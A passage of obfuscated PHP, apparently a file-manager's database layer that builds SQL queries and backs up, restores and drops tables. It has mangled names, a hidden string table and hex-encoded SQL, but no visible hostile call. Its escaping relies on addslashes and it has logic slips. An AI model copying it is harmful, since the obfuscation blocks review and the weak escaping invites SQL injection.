($ÔÉê°—Ï) { case $Ğàù”îÓ[403]: $š¡ƒè = $¤Ÿò¡…°; break; case $Ğàù”îÓ[1055]: $š¡ƒè = is_string($¤Ÿò¡…°) ? $¤Ÿò¡…° : substr($this->parseWhere($¤Ÿò¡…°), 6); break; case $Ğàù”îÓ[1073]: parse_str($¤Ÿò¡…°, $òÈçæı‡); if (isset($òÈçæı‡[$Ğàù”îÓ[1050]])) { $›„šåŠ¹ = $Ğàù”îÓ[53] . strtoupper($òÈçæı‡[$Ğàù”îÓ[1050]]) . $Ğàù”îÓ[53]; unset($òÈçæı‡[$Ğàù”îÓ[1050]]); } else { $›„šåŠ¹ = $Ğàù”îÓ[1054]; } $ß¼ÌĞİÍ = array(); foreach ($òÈçæı‡ as $¹ñ®Ú’¾ => $Ğ»Í£õ) { $ß¼ÌĞİÍ[] = $this->parseKey($¹ñ®Ú’¾) . $Ğàù”îÓ[1072] . $this->parseValue($Ğ»Í£õ); } $š¡ƒè = implode($›„šåŠ¹, $ß¼ÌĞİÍ); break; } return $š¡ƒè; } protected function parseLimit($±ì¬êı˜) { $ûéç˜ô· =& $_SERVER[³à¼î¯á]; return !empty($±ì¬êı˜) ? $ûéç˜ô·[51] . $±ì¬êı˜ . $ûéç˜ô·[53] : $ûéç˜ô·[12]; } protected function parseJoin($˜ÄÉÅ¶ê) { $’£µıËä =& $_SERVER[³à¼î¯á]; $Çöåú³è = $’£µıËä[12]; if (!empty($˜ÄÉÅ¶ê)) { if (is_array($˜ÄÉÅ¶ê)) { foreach ($˜ÄÉÅ¶ê as $ğîğ¾Ëó => $ÖÓÌ÷ƒ) { if (!1 !== stripos($ÖÓÌ÷ƒ, $’£µıËä[1074])) { $Çöåú³è .= $’£µıËä[53] . $ÖÓÌ÷ƒ; } else { $Çöåú³è .= $’£µıËä[1075] . $ÖÓÌ÷ƒ; } } } else { $Çöåú³è .= $’£µıËä[1075] . $˜ÄÉÅ¶ê; } } $Çöåú³è = preg_replace($’£µıËä[1076], think_config($’£µıËä[978]) . $’£µıËä[1077], $Çöåú³è); return $Çöåú³è; } protected function parseOrder($ûù‡¶œ) { $‘ÇÏ˜ŒÆ =& $_SERVER[³à¼î¯á]; if (is_array($ûù‡¶œ)) { $µú•Î— = array(); foreach ($ûù‡¶œ as $½…×Î¶Û => $ğäŠœòô) { if (is_numeric($½…×Î¶Û)) { $µú•Î—[] = $this->parseKey($ğäŠœòô); } else { $ğäŠœòô = in_array(strtoupper(trim($ğäŠœòô)), array($‘ÇÏ˜ŒÆ[1078], $‘ÇÏ˜ŒÆ[1079])) ? $‘ÇÏ˜ŒÆ[53] . $ğäŠœòô : $‘ÇÏ˜ŒÆ[12]; if (preg_match($‘ÇÏ˜ŒÆ[1080], $½…×Î¶Û)) { $µú•Î—[] = $this->parseKey($½…×Î¶Û) . $ğäŠœòô; } else { think_exception($‘ÇÏ˜ŒÆ[1081] . $½…×Î¶Û); } } } $ûù‡¶œ = implode($‘ÇÏ˜ŒÆ[50], $µú•Î—); } return !empty($ûù‡¶œ) ? $‘ÇÏ˜ŒÆ[1082] . $ûù‡¶œ : $‘ÇÏ˜ŒÆ[12]; } protected function parseGroup($¬óƒ³•³) { $—Ì¯²ã¦ =& $_SERVER[³à¼î¯á]; return !empty($¬óƒ³•³) ? $—Ì¯²ã¦[1083] . $¬óƒ³•³ : $—Ì¯²ã¦[12]; } protected function parseHaving($¯İìï«) { $¦ç¾ıı =& $_SERVER[³à¼î¯á]; return !empty($¯İìï«) ? $¦ç¾ıı[1084] . $¯İìï« : $¦ç¾ıı[12]; } protected function parseComment($ä™‹“æ¾) { $û¦¾‚¬¡ =& $_SERVER[³à¼î¯á]; return !empty($ä™‹“æ¾) ? $û¦¾‚¬¡[1085] . $ä™‹“æ¾ . $û¦¾‚¬¡[1086] : $û¦¾‚¬¡[12]; } protected function parseDistinct($…®Ø‡£±) { $ÚÂ˜¤«˜ =& $_SERVER[³à¼î¯á]; return !empty($…®Ø‡£±) ? $ÚÂ˜¤«˜[1087] : $ÚÂ˜¤«˜[12]; } protected function parseUnion($ØÕ§»·ì) { $²®ë²À¹ =& $_SERVER[³à¼î¯á]; if (empty($ØÕ§»·ì)) { return $²®ë²À¹[12]; } if (isset($ØÕ§»·ì[$²®ë²À¹[399]])) { $˜ÂŒ¨Áø = $²®ë²À¹[1088]; unset($ØÕ§»·ì[$²®ë²À¹[399]]); } else { $˜ÂŒ¨Áø = $²®ë²À¹[1089]; } foreach ($ØÕ§»·ì as $¸”¢Ä) { $•®¶Óñ¡[] = $˜ÂŒ¨Áø . (is_array($¸”¢Ä) ? $this->buildSelectSql($¸”¢Ä) : $¸”¢Ä); } return implode($²®ë²À¹[53], $•®¶Óñ¡); } public function insert($ö‰¢†îé, $‚òÉ“™ = array(), $Ã­ñ´ìË = false) { $ùİ‡¾à =& $_SERVER[³à¼î¯á]; $†ÓÊş¥× = $ªŠêÃ¥ = array(); $this->model = $‚òÉ“™[$ùİ‡¾à[333]]; foreach ($ö‰¢†îé as $‰áÓÕµƒ => $ƒŒ°“ô‰) { if (is_array($ƒŒ°“ô‰) && $ùİ‡¾à[348] == $ƒŒ°“ô‰[0]) { $ªŠêÃ¥[] = $this->parseKey($‰áÓÕµƒ); $†ÓÊş¥×[] = $ƒŒ°“ô‰[1]; } elseif (is_scalar($ƒŒ°“ô‰) || is_null($ƒŒ°“ô‰)) { $ªŠêÃ¥[] = $this->parseKey($‰áÓÕµƒ); $†ÓÊş¥×[] = $this->parseValue($ƒŒ°“ô‰); } } $…Øäéê· = ($Ã­ñ´ìË ? $ùİ‡¾à[955] : $ùİ‡¾à[956]) . $ùİ‡¾à[957] . $this->parseTable($‚òÉ“™[$ùİ‡¾à[331]]) . $ùİ‡¾à[951] . implode($ùİ‡¾à[50], $ªŠêÃ¥) . $ùİ‡¾à[952] . implode($ùİ‡¾à[50], $†ÓÊş¥×) . $ùİ‡¾à[953]; $…Øäéê· .= $this->parseLock(isset($‚òÉ“™[$ùİ‡¾à[888]]) ? $‚òÉ“™[$ùİ‡¾à[888]] : !1); $…Øäéê· .= $this->parseComment(!empty($‚òÉ“™[$ùİ‡¾à[405]]) ? $‚òÉ“™[$ùİ‡¾à[405]] : $ùİ‡¾à[12]); return $this->execute($…Øäéê·, $this->parseBind(!empty($‚òÉ“™[$ùİ‡¾à[336]]) ? $‚òÉ“™[$ùİ‡¾à[336]] : array())); } public function selectInsert($«—à›ô, $ü—ÏË×©, $ªØ»µìŠ = array()) { $‡ãÖÂõ– =& $_SERVER[³à¼î¯á]; $this->model = $ªØ»µìŠ[$‡ãÖÂõ–[333]]; if (is_string($«—à›ô)) { $«—à›ô = explode($‡ãÖÂõ–[50], $«—à›ô); } array_walk($«—à›ô, array($this, $‡ãÖÂõ–[954])); $Øœ¬ùñ¸ = $‡ãÖÂõ–[1090] . $this->parseTable($ü—ÏË×©) . $‡ãÖÂõ–[951] . implode($‡ãÖÂõ–[50], $«—à›ô) . $‡ãÖÂõ–[1068]; $Øœ¬ùñ¸ .= $this->buildSelectSql($ªØ»µìŠ); return $this->execute($Øœ¬ùñ¸, $this->parseBind(!empty($ªØ»µìŠ[$‡ãÖÂõ–[336]]) ? $ªØ»µìŠ[$‡ãÖÂõ–[336]] : array())); } public function update($ğ··ıÛ¼, $ò‡ÁİÅª) { $—”Æ­ˆ™ =& $_SERVER[³à¼î¯á]; $this->model = $ò‡ÁİÅª[$—”Æ­ˆ™[333]]; $¿™Şğ’é = $—”Æ­ˆ™[1091] . $this->parseTable($ò‡ÁİÅª[$—”Æ­ˆ™[331]]) . $this->parseSet($ğ··ıÛ¼) . $this->parseWhere(!empty($ò‡ÁİÅª[$—”Æ­ˆ™[327]]) ? $ò‡ÁİÅª[$—”Æ­ˆ™[327]] : $—”Æ­ˆ™[12]) . $this->parseOrder(!empty($ò‡ÁİÅª[$—”Æ­ˆ™[416]]) ? $ò‡ÁİÅª[$—”Æ­ˆ™[416]] : $—”Æ­ˆ™[12]) . $this->parseLimit(!empty($ò‡ÁİÅª[$—”Æ­ˆ™[343]]) ? $ò‡ÁİÅª[$—”Æ­ˆ™[343]] : $—”Æ­ˆ™[12]) . $this->parseLock(isset($ò‡ÁİÅª[$—”Æ­ˆ™[888]]) ? $ò‡ÁİÅª[$—”Æ­ˆ™[888]] : !1) . $this->parseComment(!empty($ò‡ÁİÅª[$—”Æ­ˆ™[405]]) ? $ò‡ÁİÅª[$—”Æ­ˆ™[405]] : $—”Æ­ˆ™[12]); return $this->execute($¿™Şğ’é, $this->parseBind(!empty($ò‡ÁİÅª[$—”Æ­ˆ™[336]]) ? $ò‡ÁİÅª[$—”Æ­ˆ™[336]] : array())); } public function delete($òâ«ò†š = array()) { $ïş¥‰Ü³ =& $_SERVER[³à¼î¯á]; $this->model = $òâ«ò†š[$ïş¥‰Ü³[333]]; $¢—¿¼’ß = $ïş¥‰Ü³[1092] . $this->parseTable($òâ«ò†š[$ïş¥‰Ü³[331]]) . $this->parseWhere(!empty($òâ«ò†š[$ïş¥‰Ü³[327]]) ? $òâ«ò†š[$ïş¥‰Ü³[327]] : $ïş¥‰Ü³[12]) . $this->parseOrder(!empty($òâ«ò†š[$ïş¥‰Ü³[416]]) ? $òâ«ò†š[$ïş¥‰Ü³[416]] : $ïş¥‰Ü³[12]) . $this->parseLimit(!empty($òâ«ò†š[$ïş¥‰Ü³[343]]) ? $òâ«ò†š[$ïş¥‰Ü³[343]] : $ïş¥‰Ü³[12]) . $this->parseLock(isset($òâ«ò†š[$ïş¥‰Ü³[888]]) ? $òâ«ò†š[$ïş¥‰Ü³[888]] : !1) . $this->parseComment(!empty($òâ«ò†š[$ïş¥‰Ü³[405]]) ? $òâ«ò†š[$ïş¥‰Ü³[405]] : $ïş¥‰Ü³[12]); return $this->execute($¢—¿¼’ß, $this->parseBind(!empty($òâ«ò†š[$ïş¥‰Ü³[336]]) ? $òâ«ò†š[$ïş¥‰Ü³[336]] : array())); } public function select($çÔã´´› = array()) { $Âü®ç¸ =& $_SERVER[³à¼î¯á]; $this->model = $çÔã´´›[$Âü®ç¸[333]]; $£«Şß¬Ê = $this->buildSelectSql($çÔã´´›); $ã»Âö› = isset($çÔã´´›[$Âü®ç¸[400]]) ? $çÔã´´›[$Âü®ç¸[400]] : !1; if ($ã»Âö›) { $ÚıŒş‘µ = is_string($ã»Âö›[$Âü®ç¸[97]]) ? $ã»Âö›[$Âü®ç¸[97]] : $Âü®ç¸[1093] . md5($£«Şß¬Ê); $ôÜ¸í÷Ü = think_cache($ÚıŒş‘µ, $Âü®ç¸[12], $ã»Âö›); if (!1 !== $ôÜ¸í÷Ü) { return $ôÜ¸í÷Ü; } } $¬†İÒØÊ = $this->query($£«Şß¬Ê, $this->parseBind(!empty($çÔã´´›[$Âü®ç¸[336]]) ? $çÔã´´›[$Âü®ç¸[336]] : array())); if ($ã»Âö› && !1 !== $¬†İÒØÊ) { think_cache($ÚıŒş‘µ, $¬†İÒØÊ, $ã»Âö›); } return $¬†İÒØÊ; } public function buildSelectSql($¯›¡‚ù÷ = array()) { $Ò¡àÈèã =& $_SERVER[³à¼î¯á]; if (isset($¯›¡‚ù÷[$Ò¡àÈèã[404]])) { if (strpos($¯›¡‚ù÷[$Ò¡àÈèã[404]], $Ò¡àÈèã[50])) { list($Ğ©ÄÃÄõ, $üÉ±Ù‚ô) = explode($Ò¡àÈèã[50], $¯›¡‚ù÷[$Ò¡àÈèã[404]]); } else { $Ğ©ÄÃÄõ = $¯›¡‚ù÷[$Ò¡àÈèã[404]]; } $Ğ©ÄÃÄõ = $Ğ©ÄÃÄõ ? $Ğ©ÄÃÄõ : 1; $üÉ±Ù‚ô = isset($üÉ±Ù‚ô) ? $üÉ±Ù‚ô : (is_numeric($¯›¡‚ù÷[$Ò¡àÈèã[343]]) ? $¯›¡‚ù÷[$Ò¡àÈèã[343]] : 20); $¼’®­ùç = $üÉ±Ù‚ô * ((int) $Ğ©ÄÃÄõ - 1); $¯›¡‚ù÷[$Ò¡àÈèã[343]] = $¼’®­ùç . $Ò¡àÈèã[50] . $üÉ±Ù‚ô; } if (think_config($Ò¡àÈèã[1094])) { $„‹şÇª„ = $Ò¡àÈèã[1095] . md5(serialize($¯›¡‚ù÷)); $„ëãˆ×é = think_cache($„‹şÇª„); if ($„ëãˆ×é) { return $„ëãˆ×é; } } $¶ëÂœ¦‚ = $this->parseSql($this->selectSql, $¯›¡‚ù÷); $¶ëÂœ¦‚ .= $this->parseLock(isset($¯›¡‚ù÷[$Ò¡àÈèã[888]]) ? $¯›¡‚ù÷[$Ò¡àÈèã[888]] : !1); if (isset($„‹şÇª„)) { think_cache($„‹şÇª„, $¶ëÂœ¦‚); } return $¶ëÂœ¦‚; } public function parseSql($ŞÊÆÙ´˜, $Â¶²×Ø… = array()) { $öçâ‚”ã =& $_SERVER[³à¼î¯á]; $ŞÊÆÙ´˜ = str_replace(array($öçâ‚”ã[1096], $öçâ‚”ã[1097], $öçâ‚”ã[1098], $öçâ‚”ã[1099], $öçâ‚”ã[1100], $öçâ‚”ã[1101], $öçâ‚”ã[1102], $öçâ‚”ã[1103], $öçâ‚”ã[1104], $öçâ‚”ã[1105], $öçâ‚”ã[1106]), array($this->parseTable("{$Â¶²×Ø…[$öçâ‚”ã[331]]}"), $this->parseDistinct(isset($Â¶²×Ø…[$öçâ‚”ã[1107]]) ? $Â¶²×Ø…[$öçâ‚”ã[1107]] : !1), $this->parseField(!empty($Â¶²×Ø…[$öçâ‚”ã[325]]) ? $Â¶²×Ø…[$öçâ‚”ã[325]] : $öçâ‚”ã[211]), $this->parseJoin(!empty($Â¶²×Ø…[$öçâ‚”ã[334]]) ? $Â¶²×Ø…[$öçâ‚”ã[334]] : $öçâ‚”ã[12]), $this->parseWhere(!empty($Â¶²×Ø…[$öçâ‚”ã[327]]) ? $Â¶²×Ø…[$öçâ‚”ã[327]] : $öçâ‚”ã[12]), $this->parseGroup(!empty($Â¶²×Ø…[$öçâ‚”ã[554]]) ? $Â¶²×Ø…[$öçâ‚”ã[554]] : $öçâ‚”ã[12]), $this->parseHaving(!empty($Â¶²×Ø…[$öçâ‚”ã[1108]]) ? $Â¶²×Ø…[$öçâ‚”ã[1108]] : $öçâ‚”ã[12]), $this->parseOrder(!empty($Â¶²×Ø…[$öçâ‚”ã[416]]) ? $Â¶²×Ø…[$öçâ‚”ã[416]] : $öçâ‚”ã[12]), $this->parseLimit(!empty($Â¶²×Ø…[$öçâ‚”ã[343]]) ? $Â¶²×Ø…[$öçâ‚”ã[343]] : $öçâ‚”ã[12]), $this->parseUnion(!empty($Â¶²×Ø…[$öçâ‚”ã[398]]) ? $Â¶²×Ø…[$öçâ‚”ã[398]] : $öçâ‚”ã[12]), $this->parseComment(!empty($Â¶²×Ø…[$öçâ‚”ã[405]]) ? $Â¶²×Ø…[$öçâ‚”ã[405]] : $öçâ‚”ã[12])), $ŞÊÆÙ´˜); return $ŞÊÆÙ´˜; } public function getLastSql($ß²÷ªõ = '') { return $ß²÷ªõ ? $this->modelSql[$ß²÷ªõ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ØĞÂŠšä) { return addslashes($ØĞÂŠšä); } public function setModel($€“¶ê²) { $this->model = $€“¶ê²; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ïªá¨à€ = array()) { $Õ¯ÉŠÑ =& $_SERVER[³à¼î¯á]; if (empty($ïªá¨à€)) { $ïªá¨à€ = $GLOBALS[$Õ¯ÉŠÑ[6]][$Õ¯ÉŠÑ[21]]; } $this->database = $ïªá¨à€; } public function model($ÜåØ¼Í† = '') { return new ModelBase($ÜåØ¼Í†, $_SERVER[³à¼î¯á][12], $this->database); } public function db($«İã¨Ë“ = false) { $Š¹ÛÜš¦ =& $_SERVER[³à¼î¯á]; $¡Ùë­ = array_change_key_case($this->database); if ($this->dbType() == $Š¹ÛÜš¦[13] || !$«İã¨Ë“) { return $this->model()->db(); } $Ê¦à§í‰ = $¡Ùë­[$Š¹ÛÜš¦[1022]]; $¡Ùë­[$Š¹ÛÜš¦[1022]] = $Š¹ÛÜš¦[12]; if ($¡Ùë­[$Š¹ÛÜš¦[1017]] == $Š¹ÛÜš¦[1014]) { $ĞŸ€Éƒ = $¡Ùë­[$Š¹ÛÜš¦[1023]]; $¡Ùë­[$Š¹ÛÜš¦[1023]] = substr($ĞŸ€Éƒ, 0, strrpos($ĞŸ€Éƒ, $Š¹ÛÜš¦[1109])); } $this->database = $¡Ùë­; $±ùİìæñ = $this->model()->db(); try { $¯èÁã·… = $±ùİìæñ->execute("\x73\150\157\167\x20\144\141\164\141\142\x61\163\x65\163\x20\x6c\x69\153\145\x20\47{$Ê¦à§í‰}\47"); } catch (Exception $ÌÀÒö™…) { } if (!$¯èÁã·…) { $±ùİìæñ->execute("\143\162\x65\x61\x74\x65\40\144\141\x74\141\142\x61\163\x65\x20\140{$Ê¦à§í‰}\140"); } $¡Ùë­[$Š¹ÛÜš¦[1022]] = $Ê¦à§í‰; if ($¡Ùë­[$Š¹ÛÜš¦[1017]] == $Š¹ÛÜš¦[1014]) { $¡Ùë­[$Š¹ÛÜš¦[1023]] .= $Š¹ÛÜš¦[1109] . $Ê¦à§í‰; } $this->database = $¡Ùë­; $±ùİìæñ->execute("\165\x73\x65\40\140{$Ê¦à§í‰}\140"); return $±ùİìæñ; } public function createTable($Î©×òãÀ, &$Èúıš) { $ø­õëÖŞ =& $_SERVER[³à¼î¯á]; if (!IO::exist($Î©×òãÀ)) { ActionCall($ø­õëÖŞ[1110], !0, 0); show_json(LNG($ø­õëÖŞ[1111]), !1); } $èıµ’±› = $this->model()->db(); $Öœµ§ø¨ = sqlSplit(IO::getContent($Î©×òãÀ)); foreach ($Öœµ§ø¨ as $…Ãú‰ˆ) { $¾¼¾öÁ = stripos($…Ãú‰ˆ, $ø­õëÖŞ[1112]) === 0; if ($¾¼¾öÁ) { $Èúıš->task[$ø­õëÖŞ[1113]] += 1; } $èıµ’±›->execute($…Ãú‰ˆ); if ($¾¼¾öÁ) { preg_match($ø­õëÖŞ[1114], $…Ãú‰ˆ, $ÔñÎ¥°÷); $Èúıš->task[$ø­õëÖŞ[1115]] = $ÔñÎ¥°÷[1]; $Èúıš->update(1); } } } public function insertTable($œáŸ°, &$ØæÛï—) { $ÈÊ­©«¤ =& $_SERVER[³à¼î¯á]; $è¦ ÚÍ = $this->model()->db(); $õ§Ñ´š = $“â¡ÜÁğ ? array($“â¡ÜÁğ) : $è¦ ÚÍ->getTables(); foreach ($œáŸ° as $­¹±œ•) { $“â¡ÜÁğ = basename($­¹±œ•, $ÈÊ­©«¤[832]); if (!in_array($“â¡ÜÁğ, $õ§Ñ´š)) { continue; } $ØæÛï—->task[$ÈÊ­©«¤[1115]] = $“â¡ÜÁğ; if (get_filesize($­¹±œ•) == 0) { continue; } $“¡ïŞ ™ = $this->sqlToDb($­¹±œ•, $ØæÛï—); if (!$“¡ïŞ ™) { ActionCall($ÈÊ­©«¤[1110], !0, 0); show_json(LNG($ÈÊ­©«¤[1116]) . "\133{$“â¡ÜÁğ}\x5d", !1); } } } public function sqlFromDb($×İı×Şí, $ŠĞğ³Ôú, &$óûÓ…½½, $Õ±´µµ¡ = '') { if ($óûÓ…½½) { $óûÓ…½½->task[$_SERVER[³à¼î¯á][1115]] = $×İı×Şí; } $¶›°ÏÑ = $this->model($×İı×Şí); $¡ãîş­› = 0; $Ğœ·ßê = 0; $¢ÈÑÄ·Ê = 10000; $ÌˆïÜ¤Ä = fopen($ŠĞğ³Ôú, $_SERVER[³à¼î¯á][1117]); $·ƒ•Ğé¢ = $¶›°ÏÑ->getPk(); $ìíéòÇÃ = $¶›°ÏÑ->getDbFields(); $®İ²¨¶¦ = $_SERVER[³à¼î¯á][12]; if ($GLOBALS[$_SERVER[³à¼î¯á][831]] && in_array($×İı×Şí, array($_SERVER[³à¼î¯á][1118], $_SERVER[³à¼î¯á][1119]))) { $®İ²¨¶¦ = $×İı×Şí; } do { $Î¤ış•Æ = array($·ƒ•Ğé¢ => array($_SERVER[³à¼î¯á][1064], $Ğœ·ßê)); $Ğ¿«« = $¶›°ÏÑ->where($Î¤ış•Æ)->field($ìíéòÇÃ)->order($·ƒ•Ğé¢ . $_SERVER[³à¼î¯á][1120])->limit($¢ÈÑÄ·Ê)->select(); $Ğ¿«« = !empty($Ğ¿««) ? $Ğ¿«« : array(); if (!($ï£ˆ¢ê = count($Ğ¿««))) { break; } $Ñ’¬©Õ‚ = end($Ğ¿««); $Ğœ·ßê = $Ñ’¬©Õ‚[$·ƒ•Ğé¢]; $ñĞ¨•äÏ = array(); foreach ($Ğ¿«« as $Õ–â¨è›) { if ($®İ²¨¶¦) { if ($×İı×Şí == $_SERVER[³à¼î¯á][1118]) { if ($Õ–â¨è›[$_SERVER[³à¼î¯á][33]] == $_SERVER[³à¼î¯á][1121]) { $®÷Ş¶óè = json_decode($Õ–â¨è›[$_SERVER[³à¼î¯á][425]], !0); if ($®÷Ş¶óè[$_SERVER[³à¼î¯á][32]] == $GLOBALS[$_SERVER[³à¼î¯á][831]] && $®÷Ş¶óè[$_SERVER[³à¼î¯á][795]] != 1) { continue; } } } else { if ($Õ–â¨è›[$_SERVER[³à¼î¯á][33]] == $_SERVER[³à¼î¯á][1122] && $Õ–â¨è›[$_SERVER[³à¼î¯á][97]] == $_SERVER[³à¼î¯á][826]) { continue; } } } if ($Õ±´µµ¡) { $Õ–â¨è›[$_SERVER[³à¼î¯á][87]] = "\173\x69\x6f\x3a{$Õ±´µµ¡}\x7d" . substr($Õ–â¨è›[$_SERVER[³à¼î¯á][87]], strlen("\173\151\x6f\x3a{$Õ–â¨è›[$_SERVER[³à¼î¯á][861]]}\x7d")); $Õ–â¨è›[$_SERVER[³à¼î¯á][861]] = $Õ±´µµ¡; } $ñĞ¨•äÏ[] = $_SERVER[³à¼î¯á][1123] . $this->sqlEncode($Õ–â¨è›) . $_SERVER[³à¼î¯á][1124]; } $Æ›‚äò = "\x49\116\x53\x45\122\x54\x20\111\116\124\x4f\x20\x60{$×İı×Şí}\x60\x20\x28\x60" . implode($_SERVER[³à¼î¯á][1125], $ìíéòÇÃ) . $_SERVER[³à¼î¯á][1126]; fwrite($ÌˆïÜ¤Ä, $Æ›‚äò . implode($_SERVER[³à¼î¯á][1127], $ñĞ¨•äÏ) . $_SERVER[³à¼î¯á][74] . PHP_EOL); $¡ãîş­› += $ï£ˆ¢ê; if ($óûÓ…½½) { $óûÓ…½½->update($ï£ˆ¢ê); } } while ($¢ÈÑÄ·Ê == $ï£ˆ¢ê); fclose($ÌˆïÜ¤Ä); return $¡ãîş­›; } public function sqlToDb($ˆÒ€Âåí, &$ –ğèƒó) { $Ñ…Š±Í =& $_SERVER[³à¼î¯á]; $à¶·¹çş = $this->model()->db(); $ˆÁ¶‹ŒØ = @fopen($ˆÒ€Âåí, $Ñ…Š±Í[1128]); if (!$ˆÁ¶‹ŒØ) { return !1; } $º¼ÖµìÖ = 0; $ÁºàÑ¨Ö = $Ñ…Š±Í[12]; $ê†–üÍÀ = array(); $íÒË…Ôû = $this->dbType(); $ïòù½—€ = $íÒË…Ôû == $Ñ…Š±Í[13] ? 500 : 2000; $·Ó¼–í‹ = basename($ˆÒ€Âåí, $Ñ…Š±Í[832]); $ñüÔïœ = 0; $¤Üšò¬° = 4194304; while (!feof($ˆÁ¶‹ŒØ)) { $€¹ó©Ïî = trim(fgets($ˆÁ¶‹ŒØ)); if (!$€¹ó©Ïî) { continue; } $õŸ•€çı = $this->sqlDecode($€¹ó©Ïî, $íÒË…Ôû, $·Ó¼–í‹); if (stripos($õŸ•€çı, $Ñ…Š±Í[406]) === 0) { if (!$ÁºàÑ¨Ö) { $ÁºàÑ¨Ö = $õŸ•€çı . $Ñ…Š±Í[53]; } continue; } if ($ –ğèƒó) { $ –ğèƒó->task[$Ñ…Š±Í[1113]] += 1; } $º¼ÖµìÖ++; $ê†–üÍÀ[] = rtrim(rtrim(trim($õŸ•€çı), $Ñ…Š±Í[50]), $Ñ…Š±Í[74]); $Ø”ãè‚¯ = null; $Ãø€À † = strlen($õŸ•€çı); $ñüÔïœ += $Ãø€À †; $ß®”äÀ = strlen($ÁºàÑ¨Ö) + $ñüÔïœ + (count($ê†–üÍÀ) - 1); if ($ß®”äÀ >= $¤Üšò¬°) { $Ø”ãè‚¯ = array_pop($ê†–üÍÀ); if ($º¼ÖµìÖ > 1) { $º¼ÖµìÖ--; } } if ($º¼ÖµìÖ >= $ïòù½—€ || $Ø”ãè‚¯) { $õŸ•€çı = $ÁºàÑ¨Ö . implode($Ñ…Š±Í[50], $ê†–üÍÀ); if (!$à¶·¹çş->execute($õŸ•€çı)) { return !1; } if ($ –ğèƒó) { $ –ğèƒó->update($º¼ÖµìÖ); } $ê†–üÍÀ = array(); $º¼ÖµìÖ = 0; $ñüÔïœ = 0; if ($Ø”ãè‚¯) { $ê†–üÍÀ = array($Ø”ãè‚¯); $º¼ÖµìÖ = 1; $ñüÔïœ = $Ãø€À †; } } } fclose($ˆÁ¶‹ŒØ); if (!empty($ê†–üÍÀ)) { $õŸ•€çı = $ÁºàÑ¨Ö . implode($Ñ…Š±Í[50], $ê†–üÍÀ); if (!$à¶·¹çş->execute($õŸ•€çı)) { return !1; } if ($ –ğèƒó) { $ –ğèƒó->update($º¼ÖµìÖ); } } return !0; } public function dropTable($·¾â¥™ = null) { $ÀªÈœ‰ = $this->model()->db(); $”Âá‹™Ò = $·¾â¥™ ? array($·¾â¥™) : $ÀªÈœ‰->getTables(); if (!$”Âá‹™Ò) { return; } foreach ($”Âá‹™Ò as $·¾â¥™) { if ($·¾â¥™) { $·¾â¥™ = strtolower($·¾â¥™); } else { continue; } $ÀªÈœ‰->execute("\144\162\157\160\40\164\x61\x62\x6c\x65\40\151\x66\x20\145\x78\x69\x73\164\x73\x20\x60{$·¾â¥™}\x60"); } } private function sqlEncode($Ü‰¹ïĞº) { $­£­èß¥ =& $_SERVER[³à¼î¯á]; $Ûß˜˜¿‡ = array(); foreach ($Ü‰¹ïĞº as $Òœıë‹Ç) { if (is_array($Òœıë‹Ç)) { $Òœıë‹Ç = json_encode_force($Òœıë‹Ç); } $Òœıë‹Ç = addslashes($Òœıë‹Ç); $Òœıë‹Ç = str_replace(array($­£­èß¥[1129], $­£­èß¥[253], $­£­èß¥[393]), array($­£­èß¥[1130], $­£­èß¥[1131], $­£­èß¥[1132]), $Òœıë‹Ç); $Ûß˜˜¿‡[] = $Òœıë‹Ç; } return $­£­èß¥[58] . implode($­£­èß¥[1133], $Ûß˜˜¿‡) . $­£­èß¥[58]; } private function sqlDecode($àÌõ¢æ‡, $­Ù¨¤„, $ôÈ¶Õªº = '') { $ˆö“óëó =& $_SERVER[³à¼î¯á]; $àÌõ¢æ‡ = str_replace(array($ˆö“óëó[1130], $ˆö“óëó[1131], $ˆö“óëó[1132]), array($ˆö“óëó[1129], $ˆö“óëó[253], $ˆö“óëó[393]), $àÌõ¢æ‡); if ($­Ù¨¤„ == $ˆö“óëó[13]) { $àÌõ¢æ‡ = str_ireplace($ˆö“óëó[1134], $ˆö“óëó[59], $àÌõ¢æ‡); $àÌõ¢æ‡ = stripslashes($àÌõ¢æ‡); } return preg_replace($ˆö“óëó[1135], $ˆö“óëó[12], $àÌõ¢æ‡); if ($­Ù¨¤„ == $ˆö“óëó[13]) { return $ôÈ¶Õªº != $ˆö“óëó[1136] ? stripslashes($àÌõ¢æ‡) : $àÌõ¢æ‡; } if ($ôÈ¶Õªº == $ˆö“óëó[1136]) { $àÌõ¢æ‡ = str_replace($ˆö“óëó[1137], $ˆö“óëó[121], stripslashes($àÌõ¢æ‡)); } return $àÌõ¢æ‡; } public function getSqlFile($¡¦Ìıµ‹ = '') { $ÜÁÏ‹ä =& $_SERVER[³à¼î¯á]; $«µÉäŸÇ = $this->dbType(!0); $İâÙ„¡˜ = CONTROLLER_DIR . "\x69\x6e\163\164\x61\154\x6c\57\x64\x61\164\141\57{$«µÉäŸÇ}\56\163\x71\x6c"; $Ä«Õ¸Íä = file_get_contents($İâÙ„¡˜); $ñİŞ¡÷Ï = $ÜÁÏ‹ä[1138] . ($«µÉäŸÇ == $ÜÁÏ‹ä[848] ? $ÜÁÏ‹ä[1139] : $ÜÁÏ‹ä[1140]) . $ÜÁÏ‹ä[1141]; preg_match_all($ñİŞ¡÷Ï, $Ä«Õ¸Íä, $„ŸÌ˜ã); $ÖõÎ¥ãï = $„ŸÌ˜ã[1]; $£¸™öê¶ = $this->model()->db(); $È¶Ú×Š = $£¸™öê¶->getTables(); $“¹×õ®Á = TEMP_FILES . $ÜÁÏ‹ä[1142] . date($ÜÁÏ‹ä[263]) . $ÜÁÏ‹ä[8]; del_dir($“¹×õ®Á); mk_dir($“¹×õ®Á); $üí‹¤ïİ = $“¹×õ®Á . $ÜÁÏ‹ä[1143]; $ßÇ–¨®€ = $“¹×õ®Á . $ÜÁÏ‹ä[1144]; $ƒîÓ¨¥’ = $«µÉäŸÇ == $ÜÁÏ‹ä[13] ? $ÜÁÏ‹ä[848] : $ÜÁÏ‹ä[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\164\x61\x6c\x6c\x2f\144\141\164\141\x2f{$ƒîÓ¨¥’}\x2e\x73\161\x6c", $“¹×õ®Á); @touch($“¹×õ®Á . $«µÉäŸÇ . $ÜÁÏ‹ä[832]); $èë–£¨ö = fopen($üí‹¤ïİ, $ÜÁÏ‹ä[1117]); $“‚é‹Ò¼ = fopen($ßÇ–¨®€, $ÜÁÏ‹ä[1117]); if ($«µÉäŸÇ == 